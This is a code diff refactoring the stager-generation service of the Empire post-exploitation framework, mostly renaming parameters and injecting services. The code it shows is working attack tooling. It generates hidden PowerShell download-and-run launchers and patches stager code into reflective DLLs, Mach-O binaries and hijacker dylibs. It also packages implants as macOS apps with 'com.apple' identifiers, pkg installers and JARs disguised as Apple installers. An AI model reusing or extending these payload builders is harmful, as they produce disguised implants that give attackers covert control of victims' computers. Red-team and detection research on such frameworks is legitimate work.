@@ -1,17 +1,3 @@
-"""
-
-Functionality that loads Empire stagers, sets generic stager options,
-and abstracts the invocation of launcher generation.
-
-The Stagers() class in instantiated in ./server.py by the main menu and includes:
-
-    generate_launcher() - abstracted functionality that invokes the generate_launcher() method for a given listener
-    generate_dll() - generates a PowerPick Reflective DLL to inject with base64-encoded stager code
-    generate_macho() - generates a macho binary with an embedded python interpreter that runs the launcher code
-    generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application
-
-"""
-
 import base64
 import errno
 import logging
@@ -19,6 +5,7 @@ import os
 import shutil
 import string
 import subprocess
+import typing
 import zipfile
 from itertools import cycle
 
@@ -29,32 +16,37 @@ except ModuleNotFoundError:
 
 import macholib.MachO
 
+from empire.server.common import helpers
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util
 from empire.server.utils.math_util import old_div
 
-from . import helpers
+if typing.TYPE_CHECKING:
+    from empire.server.common.empire import MainMenu
 
 log = logging.getLogger(__name__)
 
 
-class Stagers:
-    def __init__(self, MainMenu, args):
-        self.mainMenu = MainMenu
-        self.args = args
+class StagerGenerationService:
+    def __init__(self, main_menu: "MainMenu"):
+        self.main_menu = main_menu
+        self.listener_service = main_menu.listenersv2
+        self.agent_service = main_menu.agentsv2
+        self.plugin_service = main_menu.pluginsv2
+        self.agent_communication_service = main_menu.agentcommsv2
+        self.agent_task_service = main_menu.agenttasksv2
+        self.obfuscation_service = main_menu.obfuscationv2
 
     def generate_launcher_fetcher(
         self,
-        language=None,
         encode=True,
-        webFile="http://127.0.0.1/launcher.bat",
+        web_file="http://127.0.0.1/launcher.bat",
         launcher="powershell -noP -sta -w 1 -enc ",
     ):
-        # TODO add handle for other than powershell language
         stager = (
             'wget "'
-            + webFile
+            + web_file
             + r'" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
         )
         if encode:
@@ -64,16 +56,16 @@ class Stagers:
 
     def generate_launcher(
         self,
-        listenerName,
+        listener_name,
         language=None,
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
-        safeChecks="true",
+        proxy_creds="default",
+        stager_retries="0",
+        safe_checks="true",
         bypasses: str = "",
     ):
         """
@@ -92,31 +84,29 @@ class Stagers:
                     else:
                         log.warning(f"Invalid bypass language: {bypass.language}")
 
-            db_listener = self.mainMenu.listenersv2.get_by_name(db, listenerName)
-            active_listener = self.mainMenu.listenersv2.get_active_listener(
-                db_listener.id
-            )
+            db_listener = self.listener_service.get_by_name(db, listener_name)
+            active_listener = self.listener_service.get_active_listener(db_listener.id)
             if not active_listener:
-                log.error(f"Invalid listener: {listenerName}")
+                log.error(f"Invalid listener: {listener_name}")
                 return ""
 
             launcher_code = active_listener.generate_launcher(
                 encode=encode,
                 obfuscate=obfuscate,
                 obfuscation_command=obfuscation_command,
-                userAgent=userAgent,
+                user_agent=user_agent,
                 proxy=proxy,
-                proxyCreds=proxyCreds,
-                stagerRetries=stagerRetries,
+                proxy_creds=proxy_creds,
+                stager_retries=stager_retries,
                 language=language,
-                listenerName=listenerName,
-                safeChecks=safeChecks,
+                listener_name=listener_name,
+                safe_checks=safe_checks,
                 bypasses=bypasses_parsed,
             )
             if launcher_code:
                 return launcher_code
 
-    def generate_dll(self, poshCode, arch):
+    def generate_dll(self, posh_code, arch):
         """
         Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
         """
@@ -124,11 +114,11 @@ class Stagers:
         # read in original DLL and patch the bytes based on arch
         if arch.lower() == "x86":
             origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (
-                self.mainMenu.installPath
+                self.main_menu.installPath
             )
         else:
             origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (
-                self.mainMenu.installPath
+                self.main_menu.installPath
             )
 
         if os.path.isfile(origPath):
@@ -136,7 +126,7 @@ class Stagers:
             with open(origPath, "rb") as f:
                 dllRaw = f.read()
 
-                replacementCode = helpers.decode_base64(poshCode)
+                replacementCode = helpers.decode_base64(posh_code)
 
                 # patch the dll with the new PowerShell code
                 searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
@@ -158,19 +148,19 @@ class Stagers:
         """
         Generate powershell launcher embedded in csharp
         """
-        with open(self.mainMenu.installPath + "/stagers/CSharpPS.yaml", "rb") as f:
+        with open(self.main_menu.installPath + "/stagers/CSharpPS.yaml", "rb") as f:
             stager_yaml = f.read()
         stager_yaml = stager_yaml.decode("UTF-8")
 
         # Write text file to resources to be embedded
         with open(
-            self.mainMenu.installPath
+            self.main_menu.installPath
             + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
             "w",
         ) as f:
             f.write(posh_code)
 
-        compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
+        compiler = self.plugin_service.get_by_id("csharpserver")
         if not compiler.status == "ON":
             log.error("csharpserver plugin not running")
         else:
@@ -178,7 +168,7 @@ class Stagers:
                 stager_yaml, "CSharpPS", confuse=obfuscate
             )
 
-        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
+        directory = f"{self.main_menu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
         return directory
 
     def generate_powershell_shellcode(
@@ -210,12 +200,12 @@ class Stagers:
         """
         Generate a oneliner for a executable
         """
-        listener = self.mainMenu.listenersv2.get_active_listener_by_name(listener_name)
+        listener = self.listener_service.get_active_listener_by_name(listener_name)
 
         if getattr(listener, "parent_listener", None) is not None:
             hop = listener.options["Name"]["Value"]
             while getattr(listener, "parent_listener", None) is not None:
-                listener = self.mainMenu.listenersv2.get_active_listener_by_name(
+                listener = self.listener_service.get_active_listener_by_name(
                     listener.parent_listener.name
                 )
         else:
@@ -236,7 +226,7 @@ class Stagers:
         launcher = data_util.ps_convert_to_oneliner(launcher)
 
         if obfuscate:
-            launcher = self.mainMenu.obfuscationv2.obfuscate(
+            launcher = self.obfuscation_service.obfuscate(
                 launcher,
                 obfuscation_command=obfuscation_command,
             )
@@ -255,19 +245,19 @@ class Stagers:
         """
         Generate ironpython launcher embedded in csharp
         """
-        with open(self.mainMenu.installPath + "/stagers/CSharpPy.yaml", "rb") as f:
+        with open(self.main_menu.installPath + "/stagers/CSharpPy.yaml", "rb") as f:
             stager_yaml = f.read()
         stager_yaml = stager_yaml.decode("UTF-8")
 
         # Write text file to resources to be embedded
         with open(
-            self.mainMenu.installPath
+            self.main_menu.installPath
             + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
             "w",
         ) as f:
             f.write(python_code)
 
-        compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
+        compiler = self.plugin_service.get_by_id("csharpserver")
         if not compiler.status == "ON":
             log.error("csharpserver plugin not running")
         else:
@@ -275,7 +265,7 @@ class Stagers:
                 stager_yaml, "CSharpPy", confuse=obfuscate
             )
 
-        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
+        directory = f"{self.main_menu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
         return directory
 
     def generate_python_shellcode(
@@ -300,7 +290,7 @@ class Stagers:
         shellcode = donut.create(file=directory, arch=arch_type)
         return shellcode, None
 
-    def generate_macho(self, launcherCode):
+    def generate_macho(self, launcher_code):
         """
         Generates a macho binary with an embedded python interpreter that runs the launcher code.
         """
@@ -308,7 +298,7 @@ class Stagers:
         MH_EXECUTE = 2
         # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
         with open(
-            "%s/data/misc/machotemplate" % (self.mainMenu.installPath), "rb"
+            "%s/data/misc/machotemplate" % (self.main_menu.installPath), "rb"
         ) as f:
             macho = macholib.MachO.MachO(f.name)
 
@@ -340,11 +330,11 @@ class Stagers:
 
         if placeHolderSz and offset:
             key = "subF"
-            launcherCode = "".join(
-                chr(ord(x) ^ ord(y)) for (x, y) in zip(launcherCode, cycle(key))
+            launcher_code = "".join(
+                chr(ord(x) ^ ord(y)) for (x, y) in zip(launcher_code, cycle(key))
             )
-            launcherCode = base64.urlsafe_b64encode(launcherCode.encode("utf-8"))
-            launcher = launcherCode + b"\x00" * (placeHolderSz - len(launcherCode))
+            launcher_code = base64.urlsafe_b64encode(launcher_code.encode("utf-8"))
+            launcher = launcher_code + b"\x00" * (placeHolderSz - len(launcher_code))
             patchedMachO = (
                 template[:offset] + launcher + template[(offset + len(launcher)) :]
             )
@@ -353,7 +343,7 @@ class Stagers:
         else:
             log.error("Unable to patch MachO binary")
 
-    def generate_dylib(self, launcherCode, arch, hijacker):
+    def generate_dylib(self, launcher_code, arch, hijacker):
         """
         Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
         """
@@ -364,25 +354,26 @@ class Stagers:
             if arch == "x86":
                 f = open(
                     "%s/data/misc/hijackers/template.dylib"
-                    % (self.mainMenu.installPath),
+                    % (self.main_menu.installPath),
                     "rb",
                 )
             else:
                 f = open(
                     "%s/data/misc/hijackers/template64.dylib"
-                    % (self.mainMenu.installPath),
+                    % (self.main_menu.installPath),
                     "rb",
                 )
         else:
             if arch == "x86":
                 f = open(
-                    "%s/data/misc/templateLauncher.dylib" % (self.mainMenu.installPath),
+                    "%s/data/misc/templateLauncher.dylib"
+                    % (self.main_menu.installPath),
                     "rb",
                 )
             else:
                 f = open(
                     "%s/data/misc/templateLauncher64.dylib"
-                    % (self.mainMenu.installPath),
+                    % (self.main_menu.installPath),
                     "rb",
                 )
 
@@ -414,7 +405,7 @@ class Stagers:
         f.close()
 
         if placeHolderSz and offset:
-            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            launcher = launcher_code + "\x00" * (placeHolderSz - len(launcher_code))
             if isinstance(launcher, str):
                 launcher = launcher.encode("UTF-8")
             patchedDylib = b"".join(
@@ -425,30 +416,30 @@ class Stagers:
         else:
             log.error("Unable to patch dylib")
 
-    def generate_appbundle(self, launcherCode, Arch, icon, AppName, disarm):
+    def generate_appbundle(self, launcher_code, arch, icon, app_name, disarm):
         """
         Generates an application. The embedded executable is a macho binary with the python interpreter.
         """
         MH_EXECUTE = 2
 
-        if Arch == "x64":
+        if arch == "x64":
             f = open(
-                self.mainMenu.installPath
+                self.main_menu.installPath
                 + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher",
                 "rb",
             )
             directory = (
-                self.mainMenu.installPath
+                self.main_menu.installPath
                 + "/data/misc/apptemplateResources/x64/launcher.app/"
             )
         else:
             f = open(
-                self.mainMenu.installPath
+                self.main_menu.installPath
                 + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher",
                 "rb",
             )
             directory = (
-                self.mainMenu.installPath
+                self.main_menu.installPath
                 + "/data/misc/apptemplateResources/x86/launcher.app/"
             )
 
@@ -481,16 +472,16 @@ class Stagers:
         f.close()
 
         if placeHolderSz and offset:
-            launcher = launcherCode.encode("utf-8") + b"\x00" * (
-                placeHolderSz - len(launcherCode)
+            launcher = launcher_code.encode("utf-8") + b"\x00" * (
+                placeHolderSz - len(launcher_code)
             )
             patchedBinary = (
                 template[:offset] + launcher + template[(offset + len(launcher)) :]
             )
-            if AppName == "":
-                AppName = "launcher"
+            if app_name == "":
+                app_name = "launcher"
 
-            tmpdir = "/tmp/application/%s.app/" % AppName
+            tmpdir = "/tmp/application/%s.app/" % app_name
             shutil.copytree(directory, tmpdir)
             f = open(tmpdir + "Contents/MacOS/launcher", "wb")
             if disarm is not True:
@@ -498,7 +489,7 @@ class Stagers:
                 f.close()
             else:
                 t = open(
-                    self.mainMenu.installPath
+                    self.main_menu.installPath
                     + "/data/misc/apptemplateResources/empty/macho",
                     "rb",
                 )
@@ -509,9 +500,9 @@ class Stagers:
 
             os.rename(
                 tmpdir + "Contents/MacOS/launcher",
-                tmpdir + "Contents/MacOS/%s" % AppName,
+                tmpdir + "Contents/MacOS/%s" % app_name,
             )
-            os.chmod(tmpdir + "Contents/MacOS/%s" % AppName, 0o755)
+            os.chmod(tmpdir + "Contents/MacOS/%s" % app_name, 0o755)
 
             if icon != "":
                 iconfile = os.path.splitext(icon)[0].split("/")[-1]
@@ -527,15 +518,15 @@ class Stagers:
     <key>CFBundleDevelopmentRegion</key>
     <string>en</string>
     <key>CFBundleExecutable</key>
-    <string>{AppName}</string>
+    <string>{app_name}</string>
     <key>CFBundleIconFile</key>
     <string>{iconfile}</string>
     <key>CFBundleIdentifier</key>
-    <string>com.apple.{AppName}</string>
+    <string>com.apple.{app_name}</string>
     <key>CFBundleInfoDictionaryVersion</key>
     <string>6.0</string>
     <key>CFBundleName</key>
-    <string>{AppName}</string>
+    <string>{app_name}</string>
     <key>CFBundlePackageType</key>
     <string>APPL</string>
     <key>CFBundleShortVersionString</key>
@@ -591,19 +582,19 @@ class Stagers:
         else:
             log.error("Unable to patch application")
 
-    def generate_pkg(self, launcher, bundleZip, AppName):
+    def generate_pkg(self, launcher, bundle_zip, app_name):
         # unzip application bundle zip. Copy everything for the installer pkg to a temporary location
         os.chdir("/tmp/")
         with open("app.zip", "wb") as f:
-            f.write(bundleZip)
+            f.write(bundle_zip)
         zipf = zipfile.ZipFile("app.zip", "r")
         zipf.extractall()
         zipf.close()
         os.remove("app.zip")
 
-        os.system("cp -r " + self.mainMenu.installPath + "/data/misc/pkgbuild/ /tmp/")
+        os.system("cp -r " + self.main_menu.installPath + "/data/misc/pkgbuild/ /tmp/")
         os.chdir("pkgbuild")
-        os.system("cp -r ../" + AppName + ".app root/Applications/")
+        os.system("cp -r ../" + app_name + ".app root/Applications/")
         os.system("chmod +x root/Applications/")
         subprocess.call(
             "( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload",
@@ -650,7 +641,7 @@ class Stagers:
         </scripts>
     </pkg-info>
     """
-            pkginfo = pkginfo.replace("APPNAME", AppName)
+            pkginfo = pkginfo.replace("APPNAME", app_name)
             pkginfo = pkginfo.replace("KEY1", numFiles.decode("UTF-8"))
             pkginfo = pkginfo.replace("KEY2", str(size))
             p.write(pkginfo)
@@ -662,14 +653,14 @@ class Stagers:
             package = f.read()
         os.chdir("/tmp/")
         shutil.rmtree("pkgbuild")
-        shutil.rmtree(AppName + ".app")
+        shutil.rmtree(app_name + ".app")
         return package
 
-    def generate_jar(self, launcherCode):
-        with open(self.mainMenu.installPath + "/data/misc/Run.java") as f:
+    def generate_jar(self, launcher_code):
+        with open(self.main_menu.installPath + "/data/misc/Run.java") as f:
             javacode = f.read()
-        javacode = javacode.replace("LAUNCHER", launcherCode)
-        jarpath = self.mainMenu.installPath + "/data/misc/classes/com/installer/apple/"
+        javacode = javacode.replace("LAUNCHER", launcher_code)
+        jarpath = self.main_menu.installPath + "/data/misc/classes/com/installer/apple/"
         try:
             os.makedirs(jarpath)
         except OSError as e:
@@ -682,27 +673,27 @@ class Stagers:
             f.write(javacode)
         os.system(
             "javac "
-            + self.mainMenu.installPath
+            + self.main_menu.installPath
             + "/data/misc/classes/com/installer/apple/Run.java"
         )
         os.system(
             "jar -cfe "
-            + self.mainMenu.installPath
+            + self.main_menu.installPath
             + "/data/misc/Run.jar com.installer.apple.Run "
-            + self.mainMenu.installPath
+            + self.main_menu.installPath
             + "/data/misc/classes/com/installer/apple/Run.class"
         )
         os.remove(
-            self.mainMenu.installPath
+            self.main_menu.installPath
             + "/data/misc/classes/com/installer/apple/Run.class"
         )
         os.remove(
-            self.mainMenu.installPath
+            self.main_menu.installPath
             + "/data/misc/classes/com/installer/apple/Run.java"
         )
-        with open(self.mainMenu.installPath + "/data/misc/Run.jar", "rb") as jarfile:
+        with open(self.main_menu.installPath + "/data/misc/Run.jar", "rb") as jarfile:
             jar = jarfile.read()
-        os.remove(self.mainMenu.installPath + "/data/misc/Run.jar")
+        os.remove(self.main_menu.installPath + "/data/misc/Run.jar")
 
         return jar
 
@@ -730,7 +721,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             language = options["Language"]["Value"]
             version = ""
 
-        active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
+        active_listener = self.listener_service.get_active_listener_by_name(
             listener_name
         )
 
@@ -749,7 +740,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             host = ""
 
         with SessionLocal.begin() as db:
-            agent = self.mainMenu.agentsv2.create_agent(
+            agent = self.agent_service.create_agent(
                 db,
                 session_id,
                 "0.0.0.0",
@@ -764,7 +755,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             )
 
             # update the agent with this new information
-            self.mainMenu.agentcommsv2.update_agent_sysinfo(
+            self.agent_communication_service.update_agent_sysinfo(
                 db,
                 session_id,
                 listener=listener_name,
@@ -781,7 +772,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             )
 
             # Send initial task for sysinfo into the database
-            self.mainMenu.agenttasksv2.create_task_sysinfo(db, agent, 0)
+            self.agent_task_service.create_task_sysinfo(db, agent, 0)
 
             # get the agent's session key
             session_key = agent.session_key
